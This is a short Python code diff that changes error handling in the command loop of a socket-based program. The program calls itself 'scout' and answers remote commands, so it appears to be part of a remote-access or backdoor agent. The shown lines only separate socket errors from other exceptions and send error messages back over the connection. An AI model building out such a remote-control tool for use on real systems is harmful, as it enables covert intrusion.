@@ -264,10 +264,14 @@ def main():
                         continue
                 else:
                     s.sendall('[-]Unknown command "' + command + '", run "help" for help menu'+End)
-            except:
+            except (socket.error, socket.timeout):
                 s.shutdown(1)
                 s.close()
                 break
-
+            except Exception as e:
+                try:
+                    s.sendall('[-]Error running command "' + command + '" : ' + str(e) + End)
+                except:
+                    s.sendall('[-]Error with scout : ' + str(e))
 
 main()
